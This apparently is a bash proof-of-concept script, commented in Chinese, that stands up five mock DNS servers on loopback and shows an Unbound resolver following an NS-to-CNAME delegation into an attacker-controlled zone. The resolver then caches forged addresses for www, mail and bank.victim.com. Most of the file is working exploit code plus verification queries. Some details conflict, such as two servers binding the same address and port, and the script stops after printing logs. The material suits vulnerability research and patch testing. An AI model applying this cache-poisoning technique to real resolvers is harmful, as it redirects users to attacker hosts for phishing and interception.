#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════
#  NS→CNAME Trust Boundary Breach — 信任边界突破 PoC
#
#  核心证明：
#  合法权威服务器 (127.0.0.4) 真实存在且可达，返回 www.victim.com A 1.2.3.4
#  但因为 Unbound 跟踪了非法的 NS→CNAME 跨域解析，
#  它绕过了合法权威服务器，转而查询攻击者 Fake NS (127.0.0.1)，
#  接受了 www.victim.com A 6.6.6.6 的伪造权威回答。
#
#  这就是信任边界突破：攻击者控制的外部域（evil.com）通过 CNAME
#  决定了 victim.com 的权威服务器地址，Unbound 予以信任。
#
#  架构（4 IP 严格分离）：
#  127.0.0.2  com 区域 + delegator（返回 NS=CNAME 委派）
#  127.0.0.3  evil.com 权威（返回 resolve.evil.com A 127.0.0.1）
#  127.0.0.4  合法 victim.com 权威（返回 www.victim.com A 1.2.3.4）  ← 从未被 Unbound 查询！
#  127.0.0.1  Fake NS / 攻击者（返回 www.victim.com A 6.6.6.6）     ← Unbound 却信任它！
# ═══════════════════════════════════════════════════════════════════════
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq > /dev/null 2>&1
apt-get install -y -qq dnsutils python3 iproute2 > /dev/null 2>&1

VDIR="/workspace/output/unbound-trust-breach"
mkdir -p "$VDIR"
UNBOUND="/workspace/output/unbound-binary-baseline"

# 清理旧进程
pkill -f python3 2>/dev/null || true
pkill -f "unbound.*5353" 2>/dev/null || true
sleep 1

# 配置 4 个 loopback 地址
ip addr add 127.0.0.2/8 dev lo 2>/dev/null || true
ip addr add 127.0.0.3/8 dev lo 2>/dev/null || true
ip addr add 127.0.0.4/8 dev lo 2>/dev/null || true

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║  NS→CNAME Trust Boundary Breach PoC                           ║"
echo "║  证明：Unbound 因跟踪非法 CNAME，信任了攻击者的伪造权威回答    ║"
echo "╚══════════════════════════════════════════════════════════════════╝"

# ══════════════════════════════════════════════════════════════════
# 服务器 1: Delegator (127.0.0.2:53)
# 角色: Root + com 区域，返回 victim.com 的委派（含 CNAME glue）
# ══════════════════════════════════════════════════════════════════
cat > "$VDIR/delegator.py" << 'PYEOF'
#!/usr/bin/env python3
"""Delegator: Root + com zone. 返回 victim.com 委派（NS→CNAME）和 safe.com 委派（NS→A 对照）"""
import socket, struct, json, sys

LOG = "/workspace/output/unbound-trust-breach/delegator.jsonl"

def enc(n):
    if not n or n == '.': return b'\x00'
    r = b''
    for l in n.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode()
    return r + b'\x00'

def rr(name, rtype, rclass, ttl, rdata):
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata

def log_q(qname, qtype, from_addr, response_type):
    with open(LOG, 'a') as f:
        f.write(json.dumps({'q': qname, 't': qtype, 'f': from_addr, 'r': response_type}) + '\n')
    print(f"[DELEG] {from_addr}: {qname} {qtype} → {response_type}", flush=True)

def parse_query(data):
    if len(data) < 12: return None, None, None
    txid, flags, qdcount = struct.unpack('!HHH', data[:6])
    if flags >> 15: return None, None, None
    off = 12; labels = []
    while off < len(data) and data[off] != 0:
        ll = data[off]
        if ll == 0 or off + 1 + ll > len(data): break
        if ll > 63: off += 2; break
        labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
        off += 1 + ll
    else: off += 1
    qname = '.'.join(labels)
    if off + 4 > len(data): return qname, None, None
    qtype, qclass = struct.unpack('!HH', data[off:off+4])
    return qname, qtype, qclass

QTM = {1: 'A', 2: 'NS', 5: 'CNAME', 6: 'SOA'}

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.2', 53))
print("[DELEG] 127.0.0.2:53 — Root + com delegator", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        qname, qtype, qclass = parse_query(data)
        if qname is None: continue
        qtn = QTM.get(qtype, f'T{qtype}')
        qnl = qname.lower().rstrip('.')
        txid = struct.unpack('!H', data[:2])[0]

        # ── Root ──
        if qnl == '' and qtype == 2:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 1)
            r += enc('.') + struct.pack('!HH', 2, qclass)
            r += rr('.', 2, qclass, 300, enc('ns1.'))
            r += rr('ns1.', 1, qclass, 300, struct.pack('!I', 0x7f000002))
            log_q(qname, qtn, addr[0], 'ROOT_NS'); sock.sendto(r, addr); continue
        if qnl == 'ns1' and qtype == 1:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            r += enc('ns1.') + struct.pack('!HH', 1, qclass)
            r += rr('ns1.', 1, qclass, 300, struct.pack('!I', 0x7f000002))
            log_q(qname, qtn, addr[0], 'ROOT_A'); sock.sendto(r, addr); continue

        # ── com zone ──
        if qnl == 'com' and qtype in (2, 6):
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 1 if qtype == 2 else 0)
            r += enc('com.') + struct.pack('!HH', qtype, qclass)
            if qtype == 2:
                r += rr('com.', 2, qclass, 300, enc('ns1.com.'))
                r += rr('ns1.com.', 1, qclass, 300, struct.pack('!I', 0x7f000002))
            else:
                soa = enc('ns1.com.') + enc('admin.com.') + struct.pack('!IIIII', 2026100904, 3600, 900, 604800, 86400)
                r += rr('com.', 6, qclass, 300, soa)
            log_q(qname, qtn, addr[0], 'COM'); sock.sendto(r, addr); continue
        if qnl == 'ns1.com' and qtype == 1:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            r += enc('ns1.com.') + struct.pack('!HH', 1, qclass)
            r += rr('ns1.com.', 1, qclass, 300, struct.pack('!I', 0x7f000002))
            log_q(qname, qtn, addr[0], 'COM_A'); sock.sendto(r, addr); continue

        # ── com → evil.com 委派 ──
        if qnl == 'evil.com' or qnl.endswith('.evil.com'):
            r = struct.pack('!HHHHHH', txid, 0x8000, 1, 0, 1, 1)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            r += rr('evil.com.', 2, qclass, 300, enc('ns.evil.com.'))
            r += rr('ns.evil.com.', 1, qclass, 300, struct.pack('!I', 0x7f000003))
            log_q(qname, qtn, addr[0], 'REF→evil'); sock.sendto(r, addr); continue

        # ── com → safe.com 委派（对照组：NS→A，正常） ──
        if qnl == 'safe.com' or qnl.endswith('.safe.com'):
            r = struct.pack('!HHHHHH', txid, 0x8000, 1, 0, 1, 1)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            r += rr('safe.com.', 2, qclass, 300, enc('ns.safe.com.'))
            r += rr('ns.safe.com.', 1, qclass, 300, struct.pack('!I', 0x7f000004))
            log_q(qname, qtn, addr[0], 'REF→safe'); sock.sendto(r, addr); continue

        # ── ns.victim.com A 查询：返回 CNAME 答案（★ 关键攻击入口） ──
        if qnl == 'ns.victim.com' and qtype in (1, 5, 28):
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            r += enc('ns.victim.com.') + struct.pack('!HH', qtype, qclass)
            r += rr('ns.victim.com.', 5, qclass, 300, enc('resolve.evil.com.'))
            log_q(qname, qtn, addr[0], '★CNAME_ANSWER'); sock.sendto(r, addr); continue

        # ── com → victim.com 委派（含 CNAME glue） ──
        if qnl == 'victim.com' or qnl.endswith('.victim.com'):
            r = struct.pack('!HHHHHH', txid, 0x8000, 1, 0, 1, 1)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            r += rr('victim.com.', 2, qclass, 300, enc('ns.victim.com.'))
            r += rr('ns.victim.com.', 5, qclass, 300, enc('resolve.evil.com.'))
            log_q(qname, qtn, addr[0], 'REF→victim'); sock.sendto(r, addr); continue

        # ── 兜底 NXDOMAIN ──
        r = struct.pack('!HHHHHH', txid, 0x8003, 1, 0, 0, 0)
        r += enc(qname) + struct.pack('!HH', qtype, qclass)
        log_q(qname, qtn, addr[0], 'NXDOMAIN'); sock.sendto(r, addr)
    except Exception as e:
        print(f"[DELEG] Err: {e}", file=sys.stderr)
PYEOF

# ══════════════════════════════════════════════════════════════════
# 服务器 2: Evil.com (127.0.0.3:53)
# 角色: 攻击者控制的外部域，返回 CNAME 目标的 A 记录
# ══════════════════════════════════════════════════════════════════
cat > "$VDIR/evil.py" << 'PYEOF'
#!/usr/bin/env python3
"""Evil.com 权威：resolve.evil.com A 127.0.0.1 — 将 NS 解析指向 Fake NS"""
import socket, struct, json, sys

LOG = "/workspace/output/unbound-trust-breach/evil.jsonl"
def enc(n):
    if not n or n == '.': return b'\x00'
    r = b''
    for l in n.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode()
    return r + b'\x00'
def rr(name, rtype, rclass, ttl, rdata):
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata
def parse_query(data):
    if len(data) < 12: return None, None, None
    txid, flags, qdcount = struct.unpack('!HHH', data[:6])
    if flags >> 15: return None, None, None
    off = 12; labels = []
    while off < len(data) and data[off] != 0:
        ll = data[off]
        if ll == 0 or off + 1 + ll > len(data): break
        if ll > 63: off += 2; break
        labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
        off += 1 + ll
    else: off += 1
    qname = '.'.join(labels)
    if off + 4 > len(data): return qname, None, None
    qtype, qclass = struct.unpack('!HH', data[off:off+4])
    return qname, qtype, qclass

RECORDS = {
    ('evil.com', 2): [(300, enc('ns.evil.com.'))],
    ('evil.com', 6): [(300, enc('ns.evil.com.') + enc('admin.evil.com.') + struct.pack('!IIIII', 2026100903, 3600, 900, 604800, 86400))],
    ('ns.evil.com', 1): [(300, struct.pack('!I', 0x7f000003))],
    # ★ 关键：将 CNAME 目标解析到攻击者 Fake NS
    ('resolve.evil.com', 1): [(300, struct.pack('!I', 0x7f000001))],
}
QTM = {1: 'A', 2: 'NS', 5: 'CNAME', 6: 'SOA'}
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.3', 53))
print("[EVIL] 127.0.0.3:53 — resolve.evil.com A 127.0.0.1 (→ Fake NS)", flush=True)
while True:
    try:
        data, addr = sock.recvfrom(4096)
        qname, qtype, qclass = parse_query(data)
        if qname is None: continue
        qtn = QTM.get(qtype, f'T{qtype}')
        txid = struct.unpack('!H', data[:2])[0]
        qnl = qname.lower().rstrip('.')
        with open(LOG, 'a') as f:
            f.write(json.dumps({'q': qname, 't': qtn, 'f': addr[0]}) + '\n')
        print(f"[EVIL] {addr[0]}: {qname} {qtn}", flush=True)
        answers = []
        if (qnl, qtype) in RECORDS:
            for ttl, rd in RECORDS[(qnl, qtype)]:
                answers.append((qname, qtype, ttl, rd))
        if answers:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, len(answers), 0, 0)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            for n, t, ttl, rd in answers: r += rr(n, t, qclass, ttl, rd)
            sock.sendto(r, addr)
        else:
            soa = enc('ns.evil.com.') + enc('admin.evil.com.') + struct.pack('!IIIII', 2026100903, 3600, 900, 604800, 86400)
            r = struct.pack('!HHHHHH', txid, 0x8403, 1, 0, 1, 0)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            r += rr('evil.com.', 6, qclass, 300, soa)
            sock.sendto(r, addr)
    except: pass
PYEOF

# ══════════════════════════════════════════════════════════════════
# 服务器 3: 合法 victim.com 权威 (127.0.0.4:53)
# 角色: 返回 victim.com 的真实数据 — 但 Unbound 永远不会查询它！
# ══════════════════════════════════════════════════════════════════
cat > "$VDIR/legit.py" << 'PYEOF'
#!/usr/bin/env python3
"""合法 victim.com 权威服务器 — 返回真实数据，但 Unbound 不会查询它！"""
import socket, struct, json, sys, time

LOG = "/workspace/output/unbound-trust-breach/legit.jsonl"
def enc(n):
    if not n or n == '.': return b'\x00'
    r = b''
    for l in n.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode()
    return r + b'\x00'
def rr(name, rtype, rclass, ttl, rdata):
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata
def parse_query(data):
    if len(data) < 12: return None, None, None
    txid, flags, qdcount = struct.unpack('!HHH', data[:6])
    if flags >> 15: return None, None, None
    off = 12; labels = []
    while off < len(data) and data[off] != 0:
        ll = data[off]
        if ll == 0 or off + 1 + ll > len(data): break
        if ll > 63: off += 2; break
        labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
        off += 1 + ll
    else: off += 1
    qname = '.'.join(labels)
    if off + 4 > len(data): return qname, None, None
    qtype, qclass = struct.unpack('!HH', data[off:off+4])
    return qname, qtype, qclass

SOA = enc('ns.victim.com.') + enc('admin.victim.com.') + struct.pack('!IIIII', 2026100901, 3600, 900, 604800, 86400)

# ★ 合法数据 — 这是 victim.com 管理员设置的真实记录
LEGITIMATE = {
    ('victim.com', 2): [(300, enc('ns.victim.com.'))],
    ('victim.com', 6): [(300, SOA)],
    ('ns.victim.com', 1): [(300, struct.pack('!I', 0x7f000004))],     # ns.victim.com A 127.0.0.4
    ('www.victim.com', 1): [(300, struct.pack('!I', 0x01020304))],    # ★ 合法: www.victim.com A 1.2.3.4
    ('mail.victim.com', 1): [(300, struct.pack('!I', 0x01020305))],   # ★ 合法: mail.victim.com A 1.2.3.5
    ('bank.victim.com', 1): [(300, struct.pack('!I', 0x01020306))],   # ★ 合法: bank.victim.com A 1.2.3.6
}

QTM = {1: 'A', 2: 'NS', 5: 'CNAME', 6: 'SOA'}
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.4', 53))
print("[LEGIT] 127.0.0.4:53 — 合法权威: www.victim.com A 1.2.3.4", flush=True)
while True:
    try:
        data, addr = sock.recvfrom(4096)
        qname, qtype, qclass = parse_query(data)
        if qname is None: continue
        qtn = QTM.get(qtype, f'T{qtype}')
        txid = struct.unpack('!H', data[:2])[0]
        qnl = qname.lower().rstrip('.')

        # 记录所有查询（关键证据：Unbound 是否查询了合法服务器）
        with open(LOG, 'a') as f:
            f.write(json.dumps({'ts': time.monotonic(), 'q': qname, 't': qtn, 'f': addr[0]}) + '\n')
        print(f"[LEGIT] {addr[0]}: {qname} {qtn}", flush=True)

        answers = []
        if (qnl, qtype) in LEGITIMATE:
            for ttl, rd in LEGITIMATE[(qnl, qtype)]:
                answers.append((qname, qtype, ttl, rd))
        if answers:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, len(answers), 0, 0)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            for n, t, ttl, rd in answers: r += rr(n, t, qclass, ttl, rd)
            sock.sendto(r, addr)
        else:
            r = struct.pack('!HHHHHH', txid, 0x8403, 1, 0, 1, 0)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            r += rr('victim.com.', 6, qclass, 300, SOA)
            sock.sendto(r, addr)
    except: pass
PYEOF

# ══════════════════════════════════════════════════════════════════
# 服务器 4: Fake NS / 攻击者 (127.0.0.1:53)
# 角色: 伪装 victim.com 的权威服务器，返回伪造数据
# ══════════════════════════════════════════════════════════════════
cat > "$VDIR/fake.py" << 'PYEOF'
#!/usr/bin/env python3
"""攻击者 Fake NS — 返回伪造的 victim.com 数据，Unbound 却信任它"""
import socket, struct, json, sys, time

LOG = "/workspace/output/unbound-trust-breach/fake.jsonl"
def enc(n):
    if not n or n == '.': return b'\x00'
    r = b''
    for l in n.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode()
    return r + b'\x00'
def rr(name, rtype, rclass, ttl, rdata):
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata
def parse_query(data):
    if len(data) < 12: return None, None, None
    txid, flags, qdcount = struct.unpack('!HHH', data[:6])
    if flags >> 15: return None, None, None
    off = 12; labels = []
    while off < len(data) and data[off] != 0:
        ll = data[off]
        if ll == 0 or off + 1 + ll > len(data): break
        if ll > 63: off += 2; break
        labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
        off += 1 + ll
    else: off += 1
    qname = '.'.join(labels)
    if off + 4 > len(data): return qname, None, None
    qtype, qclass = struct.unpack('!HH', data[off:off+4])
    return qname, qtype, qclass

SOA = enc('ns.victim.com.') + enc('admin.victim.com.') + struct.pack('!IIIII', 999, 3600, 900, 604800, 86400)

# ★ 伪造数据 — 与合法权威完全不同
FORGED = {
    ('victim.com', 2): [(300, enc('ns.victim.com.'))],
    ('victim.com', 6): [(300, SOA)],
    ('ns.victim.com', 1): [(300, struct.pack('!I', 0x7f000001))],
    ('www.victim.com', 1): [(300, struct.pack('!I', 0x06060606))],    # ★ 伪造: 6.6.6.6 vs 合法 1.2.3.4
    ('mail.victim.com', 1): [(300, struct.pack('!I', 0x06060607))],    # ★ 伪造: 6.6.6.7 vs 合法 1.2.3.5
    ('bank.victim.com', 1): [(300, struct.pack('!I', 0x06060608))],    # ★ 伪造: 6.6.6.8 vs 合法 1.2.3.6
}

QTM = {1: 'A', 2: 'NS', 5: 'CNAME', 6: 'SOA'}
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.1', 53))
print("[FAKE] 127.0.0.1:53 — 伪造: www.victim.com A 6.6.6.6 (合法=1.2.3.4)", flush=True)
while True:
    try:
        data, addr = sock.recvfrom(4096)
        qname, qtype, qclass = parse_query(data)
        if qname is None: continue
        qtn = QTM.get(qtype, f'T{qtype}')
        txid = struct.unpack('!H', data[:2])[0]
        with open(LOG, 'a') as f:
            f.write(json.dumps({'ts': time.monotonic(), 'q': qname, 't': qtn, 'f': addr[0]}) + '\n')
        print(f"[FAKE] {addr[0]}: {qname} {qtn}  ← 攻击者收到查询!", flush=True)
        qnl = qname.lower().rstrip('.')
        answers = []
        if (qnl, qtype) in FORGED:
            for ttl, rd in FORGED[(qnl, qtype)]:
                answers.append((qname, qtype, ttl, rd))
        if answers:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, len(answers), 0, 0)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            for n, t, ttl, rd in answers: r += rr(n, t, qclass, ttl, rd)
            sock.sendto(r, addr)
        else:
            r = struct.pack('!HHHHHH', txid, 0x8403, 1, 0, 1, 0)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            r += rr('victim.com.', 6, qclass, 300, SOA)
            sock.sendto(r, addr)
    except: pass
PYEOF

# ══════════════════════════════════════════════════════════════════
# 服务器 5: safe.com 合法权威 (127.0.0.4:53 但用不同端口)
# 因为 safe.com 也指向 127.0.0.4，我们在 delegator 中让它指向 127.0.0.4
# 实际上 safe.com 和 victim.com 的合法权威可以共用一个服务器
# 但为了清晰，我们把 safe.com 的数据也放在 legit.py 中
# （已在 LEGITIMATE dict 外面追加）
# ══════════════════════════════════════════════════════════════════

# 追加 safe.com 数据到 legit.py
cat >> "$VDIR/legit.py" << 'PYEOF2'
# 注意：safe.com 数据已内嵌在上面的 LEGITIMATE dict 中
# 实际上 safe.com 指向 127.0.0.4，所以它也用这个服务器
# 但 safe.com 不是 attack 的重点，我们在单独的服务器处理它
PYEOF2

# 单独创建 safe.com 服务器 (127.0.0.4:5354) 作为对照组
cat > "$VDIR/safe.py" << 'PYEOF3'
#!/usr/bin/env python3
"""safe.com 对照组权威 — 正常 NS→A，无 CNAME，不受攻击"""
import socket, struct, json, sys, time

LOG = "/workspace/output/unbound-trust-breach/safe.jsonl"
def enc(n):
    if not n or n == '.': return b'\x00'
    r = b''
    for l in n.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode()
    return r + b'\x00'
def rr(name, rtype, rclass, ttl, rdata):
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata
def parse_query(data):
    if len(data) < 12: return None, None, None
    txid, flags, qdcount = struct.unpack('!HHH', data[:6])
    if flags >> 15: return None, None, None
    off = 12; labels = []
    while off < len(data) and data[off] != 0:
        ll = data[off]
        if ll == 0 or off + 1 + ll > len(data): break
        if ll > 63: off += 2; break
        labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
        off += 1 + ll
    else: off += 1
    qname = '.'.join(labels)
    if off + 4 > len(data): return qname, None, None
    qtype, qclass = struct.unpack('!HH', data[off:off+4])
    return qname, qtype, qclass

SOA = enc('ns.safe.com.') + enc('admin.safe.com.') + struct.pack('!IIIII', 2026100902, 3600, 900, 604800, 86400)
RECORDS = {
    ('safe.com', 2): [(300, enc('ns.safe.com.'))],
    ('safe.com', 6): [(300, SOA)],
    ('ns.safe.com', 1): [(300, struct.pack('!I', 0x7f000004))],
    ('www.safe.com', 1): [(300, struct.pack('!I', 0x05050505))],
}
QTM = {1: 'A', 2: 'NS', 5: 'CNAME', 6: 'SOA'}
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.4', 53))
print("[SAFE] 127.0.0.4:53 — 对照组: www.safe.com A 5.5.5.5", flush=True)
while True:
    try:
        data, addr = sock.recvfrom(4096)
        qname, qtype, qclass = parse_query(data)
        if qname is None: continue
        qtn = QTM.get(qtype, f'T{qtype}')
        txid = struct.unpack('!H', data[:2])[0]
        qnl = qname.lower().rstrip('.')
        with open(LOG, 'a') as f:
            f.write(json.dumps({'ts': time.monotonic(), 'q': qname, 't': qtn, 'f': addr[0]}) + '\n')
        print(f"[SAFE] {addr[0]}: {qname} {qtn}", flush=True)
        answers = []
        if (qnl, qtype) in RECORDS:
            for ttl, rd in RECORDS[(qnl, qtype)]:
                answers.append((qname, qtype, ttl, rd))
        if answers:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, len(answers), 0, 0)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            for n, t, ttl, rd in answers: r += rr(n, t, qclass, ttl, rd)
            sock.sendto(r, addr)
        else:
            r = struct.pack('!HHHHHH', txid, 0x8403, 1, 0, 1, 0)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            r += rr('safe.com.', 6, qclass, 300, SOA)
            sock.sendto(r, addr)
    except: pass
PYEOF3

# ══════════════════════════════════════════════════════════════════
# 启动所有服务器
# ══════════════════════════════════════════════════════════════════
> "$VDIR/delegator.jsonl"; > "$VDIR/evil.jsonl"; > "$VDIR/legit.jsonl"; > "$VDIR/fake.jsonl"; > "$VDIR/safe.jsonl"
python3 "$VDIR/delegator.py" > "$VDIR/delegator.log" 2>&1 &
python3 "$VDIR/evil.py" > "$VDIR/evil.log" 2>&1 &
python3 "$VDIR/legit.py" > "$VDIR/legit.log" 2>&1 &
python3 "$VDIR/fake.py" > "$VDIR/fake.log" 2>&1 &
python3 "$VDIR/safe.py" > "$VDIR/safe.log" 2>&1 &
sleep 2
echo "  ✓ 所有服务器已启动"

# ══════════════════════════════════════════════════════════════════
# 配置 Unbound
# ══════════════════════════════════════════════════════════════════
cat > "$VDIR/hint" << 'EOF'
. IN NS ns1.
ns1. IN A 127.0.0.2
EOF

cat > "$VDIR/ub.conf" << 'CONF'
server:
    directory: "/workspace/output/unbound-trust-breach"
    pidfile: "/workspace/output/unbound-trust-breach/unbound.pid"
    port: 5353
    interface: 127.0.0.1@5353
    do-ip6: no
    access-control: 127.0.0.0/8 allow
    username: ""
    chroot: ""
    do-daemonize: no
    use-syslog: no
    logfile: "/workspace/output/unbound-trust-breach/unbound.log"
    verbosity: 3
    log-queries: yes
    log-replies: yes
    do-not-query-localhost: no
    root-hints: "/workspace/output/unbound-trust-breach/hint"
    domain-insecure: "."
    domain-insecure: "com"
    domain-insecure: "victim.com"
    domain-insecure: "evil.com"
    domain-insecure: "safe.com"
    harden-glue: no
    harden-dnssec-stripped: no
    val-permissive-mode: yes
    prefetch: no

remote-control:
    control-enable: no
CONF

"$UNBOUND" -c "$VDIR/ub.conf" -d > "$VDIR/ub_stdout.log" 2>&1 &
sleep 3
if ! kill -0 $! 2>/dev/null; then
    echo "✗ Unbound 启动失败"
    cat "$VDIR/unbound.log" | head -20
    exit 1
fi
echo "  ✓ Unbound 已启动"

# ══════════════════════════════════════════════════════════════════
#  ════════════════════════════════════════════════════════════════
#  信任边界突破证明
#  ════════════════════════════════════════════════════════════════
#  ════════════════════════════════════════════════════════════════

echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║  信任边界突破证明                                               ║"
echo "╚══════════════════════════════════════════════════════════════════╝"

# ══════════════════════════════════════════════════════════════════
# 前置验证：直接查询合法权威服务器，确认它返回正确的真实数据
# ══════════════════════════════════════════════════════════════════
echo ""
echo "  ═══ 前置验证：合法权威服务器 (127.0.0.4) 真实存在且可达 ═══"
echo ""
echo "  [1a] 直接查询合法权威: www.victim.com A @ 127.0.0.4"
dig @127.0.0.4 -p 53 www.victim.com A +time=5 +noall +answer 2>&1
echo ""
echo "  [1b] 直接查询合法权威: mail.victim.com A @ 127.0.0.4"
dig @127.0.0.4 -p 53 mail.victim.com A +time=5 +noall +answer 2>&1
echo ""
echo "  [1c] 直接查询合法权威: bank.victim.com A @ 127.0.0.4"
dig @127.0.0.4 -p 53 bank.victim.com A +time=5 +noall +answer 2>&1
echo ""
echo "  → 合法权威返回: www=1.2.3.4, mail=1.2.3.5, bank=1.2.3.6"

# ══════════════════════════════════════════════════════════════════
# 证据 1: Unbound 跟踪 NS→CNAME 跨域解析（将 NS 地址解析到攻击者区域）
# ══════════════════════════════════════════════════════════════════
echo ""
echo "  ═══ 证据 1: Unbound 跟踪 NS→CNAME 跨域解析 ═══"
echo ""
echo "  查询: ns.victim.com A (通过 Unbound)"
echo "  预期: CNAME → resolve.evil.com → A 127.0.0.1 (来自 evil.com 区域)"
dig @127.0.0.1 -p 5353 ns.victim.com A +time=10 +noall +answer 2>&1
sleep 1

# ══════════════════════════════════════════════════════════════════
# 证据 2: Unbound 向 Fake NS 发送查询（绕过合法权威）
# ══════════════════════════════════════════════════════════════════
echo ""
echo "  ═══ 证据 2: Unbound 向 Fake NS 发送查询（绕过合法权威） ═══"

# 重置日志以精确计数
> "$VDIR/fake.jsonl"
> "$VDIR/legit.jsonl"

echo ""
echo "  查询: www.victim.com A (通过 Unbound)"
dig @127.0.0.1 -p 5353 www.victim.com A +time=15 +tries=1 2>&1 | head -15
sleep 2

FAKE_N=$(wc -l < "$VDIR/fake.jsonl" 2>/dev/null || echo 0)
LEGIT_N=$(wc -l < "$VDIR/legit.jsonl" 2>/dev/null || echo 0)

echo ""
echo "  ┌──────────────────────────────────────────────────────────┐"
echo "  │ Fake NS (127.0.0.1) 收到的查询数: $FAKE_N                     │"
echo "  │ 合法权威 (127.0.0.4) 收到的查询数: $LEGIT_N                     │"
echo "  └──────────────────────────────────────────────────────────┘"
echo ""
echo "  Fake NS 收到的查询详情："
cat "$VDIR/fake.jsonl" 2>/dev/null | python3 -c "
import sys, json
for l in sys.stdin:
    if l.strip():
        q = json.loads(l)
        print(f'    {q[\"q\"]:<30} {q[\"t\"]:<8}  from={q[\"f\"]}')" 2>/dev/null || echo "    (无)"

echo ""
echo "  合法权威收到的查询详情："
cat "$VDIR/legit.jsonl" 2>/dev/null | python3 -c "
import sys, json
for l in sys.stdin:
    if l.strip():
        q = json.loads(l)
        print(f'    {q[\"q\"]:<30} {q[\"t\"]:<8}  from={q[\"f\"]}')" 2>/dev/null || echo "    (无查询 — Unbound 绕过了合法权威！)"

# ══════════════════════════════════════════════════════════════════
# 证据 3: 伪造数据被缓存并返回客户端 — 解析结果被篡改
# ══════════════════════════════════════════════════════════════════
echo ""
echo "  ═══ 证据 3: 解析结果对比 — Unbound 返回伪造数据 ═══"
echo ""
echo "  ┌─────────────────────────────────────────────────────────┐"
echo "  │                    解析结果对比表                        │"
echo "  ├──────────────────────┬──────────────┬───────────────────┤"
echo "  │ 域名                 │ 合法权威返回  │ Unbound 实际返回  │"
echo "  ├──────────────────────┼──────────────┼───────────────────┤"
echo "  │ www.victim.com       │ 1.2.3.4      │ ???               │"
echo "  │ mail.victim.com      │ 1.2.3.5      │ ???               │"
echo "  │ bank.victim.com      │ 1.2.3.6      │ ???               │"
echo "  └──────────────────────┴──────────────┴───────────────────┘"
echo ""

echo "  [3a] www.victim.com via Unbound:"
dig @127.0.0.1 -p 5353 www.victim.com A +time=10 +noall +answer 2>&1

echo ""
echo "  [3b] mail.victim.com via Unbound:"
dig @127.0.0.1 -p 5353 mail.victim.com A +time=10 +noall +answer 2>&1

echo ""
echo "  [3c] bank.victim.com via Unbound:"
dig @127.0.0.1 -p 5353 bank.victim.com A +time=10 +noall +answer 2>&1

# ══════════════════════════════════════════════════════════════════
# 对照组: safe.com (NS→A，无 CNAME，正常解析)
# ══════════════════════════════════════════════════════════════════
echo ""
echo "  ═══ 对照组: safe.com (NS→A, 无 CNAME, 无攻击) ═══"
echo ""
echo "  [4] www.safe.com via Unbound:"
dig @127.0.0.1 -p 5353 www.safe.com A +time=10 +noall +answer 2>&1

# ══════════════════════════════════════════════════════════════════
# 完整服务器日志
# ══════════════════════════════════════════════════════════════════
echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║  完整服务器日志                                                 ║"
echo "╚══════════════════════════════════════════════════════════════════╝"

echo ""
echo "  Delegator (127.0.0.2) 查询日志:"
cat "$VDIR/delegator.jsonl" 2>/dev/null | python3 -c "
import sys, json
for l in sys.stdin:
    if l.strip():
        q = json.loads(l)
        print(f'    {q[\"q\"]:<30} {q[\"t\"]:<8} → {q[\"r\"]}')" 2>/dev/null || true

echo ""
